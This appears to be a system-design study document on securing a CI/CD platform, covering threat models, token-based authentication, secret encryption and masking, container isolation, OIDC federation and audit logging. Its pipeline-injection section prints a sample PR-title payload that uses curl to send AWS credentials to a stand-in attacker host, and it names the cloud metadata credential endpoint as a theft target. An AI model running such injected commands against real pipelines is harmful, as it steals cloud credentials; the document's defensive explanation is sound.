# 08 — Security Design: CI/CD Platform

---

## Objective

Define authentication, authorization, secret management, isolation, and audit mechanisms for a CI/CD platform. CI/CD platforms are high-value targets — they have code access, secret access, and deployment capabilities across an entire organization.

---

## Threat Model

| Threat | Impact | Mitigation |
|---|---|---|
| Compromised job reads other org's secrets | Data exfiltration | Job-scoped tokens; secret isolation by org/repo |
| Malicious YAML injects commands (pipeline injection) | Arbitrary code execution on runner | Sanitize workflow inputs; never interpolate untrusted data in shell commands |
| Compromised runner accesses control plane DB | Full system compromise | Runners have no DB access; only Secret Service gRPC |
| Artifact poisoning (upload malicious artifact) | Supply chain attack | Artifact integrity hash; artifact signing (Sigstore) |
| Stolen PAT used from attacker's network | Account takeover | Token scoping; IP allowlist; short-lived tokens |
| Secret values leaked in logs | Credential exposure | Mandatory secret masking in Log Service |
| Replay attack on webhook | Trigger malicious pipelines | Webhook timestamp validation (reject > 5 min old) |
| Privilege escalation via workflow YAML | Run jobs with elevated permissions | Principle of least privilege; OIDC for cloud creds |
| Dependency confusion / poisoning in build | Compromised build output | Private registry pinning; dependency lock files |

---

## Authentication

### User Authentication (Web UI / CLI)

**OAuth2 Authorization Code + PKCE:**
1. User redirected to identity provider (GitHub OAuth, Google SSO, SAML enterprise)
2. IdP returns authorization code → exchanged for JWT
3. JWT valid for 1 hour; refresh token valid for 30 days
4. All API calls carry `Authorization: Bearer <jwt>`

**JWT Claims:**
```json
{
  "sub": "user-uuid",
  "org_id": "org-uuid",
  "roles": ["member", "admin"],
  "iat": 1705312200,
  "exp": 1705315800
}
```

**Personal Access Tokens (PAT):**
- For CLI and machine access
- Stored as HMAC-SHA256 hash in DB (never plaintext)
- Scoped: `repo:read`, `run:write`, `secret:write`, `admin`
- Optional: IP allowlist per token
- Expiry: 90 days default; never-expire for machine tokens (with audit justification)

### Runner Authentication

**Managed runners (K8s pods):**
1. Scheduler creates `JobToken` (JWT signed with private key) at dispatch time
2. Token claims: `{jobId, orgId, repoId, secretNames[], exp: +15min}`
3. Token embedded in `JobDispatchEvent` payload
4. Runner presents token to Secret Service gRPC — validates signature + not expired + jobId matches current assignment

**Self-hosted runners:**
1. Admin generates one-time `RegistrationToken` (cryptographically random, 1 hour TTL)
2. Runner exchanges RegistrationToken for long-lived `RunnerCredential` (client cert + ID)
3. Subsequent API calls: mTLS with runner client cert
4. Runner can only consume jobs tagged for its org

---

## Authorization (RBAC)

### Roles

| Role | Permissions |
|---|---|
| Org Member | View runs, view logs, download artifacts, trigger manual runs on own repos |
| Repo Admin | All Member + manage secrets, manage webhooks, cancel runs |
| Org Admin | All Repo Admin + manage org settings, runners, members |
| Platform Admin | All orgs (read-only by default; explicit write requires 2FA confirm) |

### Resource-Level Authorization

```
Policy enforcement: every API handler checks:
  hasPermission(actor, action, resource)

Examples:
  GET /runs/{runId} → verify actor's org matches run's org
  POST /secrets/{name} → verify actor has REPO_ADMIN on that repo
  POST /runs/{runId}/cancel → verify actor is member of run's org
```

**No cross-org visibility:** Organization scoping enforced at every query level — `WHERE org_id = ?` on all DB queries. Defense in depth against SQL injection accidentally exposing cross-org data.

---

## Secret Security

### Secret Storage

```
User submits secret value
→ Secret Service encrypts with KMS data key (unique per org)
→ Encrypted ciphertext stored in DB
→ KMS master key stored in HSM (AWS KMS / GCP KMS)

Decryption flow:
→ Runner requests secret (with job-scoped token)
→ Secret Service validates token
→ Secret Service calls KMS: decrypt(ciphertext, orgKeyId)
→ KMS returns plaintext only if authorization check passes
→ Secret Service returns plaintext in gRPC response (in-memory)
→ Runner injects as environment variable
→ Value NEVER written to disk or logs
```

### Secret Injection Security

**Process isolation:**
- Secret values exist only in runner process memory
- Environment variables not visible to other processes (standard OS isolation)
- Workspace directory: `chmod 700` — only runner process can read

**Log masking:**
```
At job start:
  Scheduler calls Log Service: "for jobId X, mask patterns: ['ACTUAL_SECRET_VALUE']"

Wait — this sends the actual secret value to Log Service?

No. Better approach:
  Secret Service generates a "mask token" per secret: SHA256(secret_value)[:8]
  Scheduler sends mask tokens to Log Service (not actual values)
  Log Service: if runner logs contain text matching the mask token hash → mask

Simpler approach (GitHub's model):
  Secrets are masked by the runner itself before sending to Log Service
  Runner's log streamer replaces known secret values with *** before streaming
  Log Service receives already-masked log bytes
  Secret values NEVER leave runner process in log bytes
```

**Runner-side masking is the correct approach** — runner knows the secret values (already decrypted), replaces in log stream before sending. Log Service is not trusted with actual values.

### Secret Rotation

```
User updates secret:
  PUT /secrets/AWS_KEY { value: "new-value" }

Secret Service:
  1. Encrypt new value with KMS
  2. UPDATE secrets SET encrypted_value=new, updated_at=NOW()
  3. No immediate runner notification needed
  
Next job start:
  Runner fetches secrets → gets new value automatically
  
In-flight jobs:
  Continue with old value (already decrypted at start)
  No mechanism to hot-reload secrets during job execution (by design)
```

---

## Job Isolation

### Container-Level Isolation

Each job runs in a dedicated container:
- **Separate network namespace:** no inter-job network access
- **Separate filesystem:** each job gets fresh container image layer
- **Resource limits:** CPU and memory via cgroups
- **No persistent storage between jobs:** workspace destroyed on job completion
- **No access to host filesystem:** volume mounts only for designated paths

### Docker-in-Docker Security

Jobs that build Docker images need Docker access. Risks:
- `docker.sock` mount grants root-equivalent access to host
- Can break out of container with `docker run -v /:/host` equivalent

**Mitigations:**
1. **rootless Docker** on runner: Docker daemon runs as non-root user → breakout still limited to runner user
2. **Kaniko** (Google): Docker image builds without requiring Docker daemon — runs as normal container
3. **sysbox** or **kata-containers**: VM-level isolation for jobs that need full Docker access

**Policy for privileged operations:**
- Managed runners: rootless Docker only; privileged containers not permitted
- Self-hosted: org admin explicitly enables privileged mode (they own the runner)

### Network Policies

```yaml
# Kubernetes NetworkPolicy for runner namespace
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: runner-network-policy
  namespace: cicd-runners
spec:
  podSelector:
    matchLabels:
      app: runner
  policyTypes:
  - Ingress
  - Egress
  ingress: []  # No inbound connections to runner pods
  egress:
  - to: []  # Allow all egress (runners need internet for npm, apt, etc.)
    ports: []
  # Exception: block access to metadata service (cloud credentials)
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
        - 169.254.169.254/32  # EC2/GCE metadata API
```

**Block metadata API:** Prevents runner code from stealing cloud credentials via `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.

---

## OIDC Federation (Advanced)

**Problem with static cloud credentials:**
- Long-lived AWS access keys stored as secrets → high blast radius if leaked
- Rotation requires manual process

**OIDC solution:**
1. CI/CD platform is an OIDC provider (issues tokens with claims about job context)
2. Cloud provider (AWS, GCP) trusts the platform's OIDC issuer
3. Runner requests short-lived cloud credentials by presenting OIDC token
4. AWS STS exchanges OIDC token for temporary IAM role credentials (15 min TTL)

**OIDC token claims:**
```json
{
  "iss": "https://cicd.example.com",
  "sub": "repo:org/repo:ref:refs/heads/main",
  "aud": "sts.amazonaws.com",
  "job_workflow_ref": "org/repo/.github/workflows/deploy.yml@refs/heads/main",
  "exp": ...
}
```

**AWS trust policy:**
```json
{
  "Condition": {
    "StringEquals": {
      "cicd.example.com:sub": "repo:my-org/my-repo:ref:refs/heads/main"
    }
  }
}
```

This pins the IAM role to a specific org/repo/branch — no other job can assume this role.

---

## Pipeline Injection Prevention

**Vulnerability: expression injection**

```yaml
# DANGEROUS
- run: echo "PR title: ${{ github.event.pull_request.title }}"
```

If PR title is `; curl attacker.com -d "$(cat ~/.aws/credentials)"` → arbitrary command injection.

**Mitigations:**
1. **Validate input before interpolation:** escape shell metacharacters in user-supplied values
2. **Intermediary environment variable:**
   ```yaml
   env:
     PR_TITLE: ${{ github.event.pull_request.title }}  # safe interpolation into env var
   - run: echo "PR title: $PR_TITLE"  # shell reads from env, no injection
   ```
3. **Restricted context access:** Limit which fields of event payload are interpolatable
4. **Read-only workflow:** workflows triggered by fork PRs run without secrets (contributor can't steal secrets via injected workflow)

---

## Audit Logging

### What to Audit

```
AuditEvent {
  timestamp: ISO8601
  actor: {userId, orgId, ip, userAgent}
  action: string  // RUN_TRIGGERED, SECRET_CREATED, SECRET_ACCESSED, RUNNER_REGISTERED, etc.
  resource: {type, id}
  result: SUCCESS | FAILURE
  metadata: JSON  // action-specific context
}
```

### High-Priority Audit Events

| Event | Reason |
|---|---|
| `SECRET_ACCESSED` | Every time runner fetches a secret |
| `SECRET_CREATED` / `SECRET_UPDATED` | Track secret lifecycle |
| `RUN_TRIGGERED` | Traceability: who/what triggered this run |
| `RUNNER_REGISTERED` | Self-hosted runner registration |
| `ORG_MEMBER_ADDED/REMOVED` | Access control changes |
| `PAT_CREATED` / `PAT_REVOKED` | Token lifecycle |
| `ARTIFACT_DOWNLOADED` | Who downloaded sensitive build outputs |

### Audit Log Storage

- Written to append-only PostgreSQL `audit_log` table (separate DB from operational data)
- Replicated to S3 (immutable, versioned bucket) — prevents audit log tampering
- Retention: 1 year in S3 (compliance requirement)
- Export: SIEM integration (Splunk, Elastic) via S3 event notification

---

## Tradeoffs

| Decision | Why | Cost |
|---|---|---|
| Runner-side secret masking | Log Service never sees secret values | Runner must mask ALL outputs; one missed codepath = leak |
| Job-scoped tokens (not runner-scoped) | Blast radius limited to specific job | Token management overhead per job |
| OIDC over static credentials | Eliminates long-lived secret rotation burden | Requires cloud provider OIDC trust configuration |
| Block metadata API in NetworkPolicy | Prevent credential theft via cloud metadata | Some legitimate use cases blocked (instance detection) |
| Separate audit DB | Audit log independence from app failures | Another DB to manage |

---

## Interview Discussion Points

- **How do you prevent a malicious PR from exfiltrating secrets?** Fork PR workflows run without access to org secrets (read-only mode). Secrets only available to runs triggered by org members or approved external contributors. `pull_request_target` event requires explicit opt-in
- **What is the blast radius of a compromised runner pod?** Limited to: secrets for the specific job (not all org secrets), the specific job's workspace (not other jobs), access to public internet. Cannot access other pods, PostgreSQL, or secrets outside the JobToken scope
- **How do you detect secret leakage in logs?** Runner masks all known secret values before streaming. Automated scanning: regex patterns for common secret formats (AWS keys, tokens starting with `ghp_`) run against stored logs — alert if match found
- **What happens when a user deletes a secret that's currently in-flight?** In-flight job already has the secret value in memory — continues successfully. Secret deletion takes effect for future jobs. No retroactive revocation of already-injected secrets
- **How do you handle a compromised PAT?** User or admin revokes PAT → marked `revoked_at` in DB → API Gateway validation rejects. No session invalidation needed (tokens are stateless JWT but PAT is validated against DB record on every request)
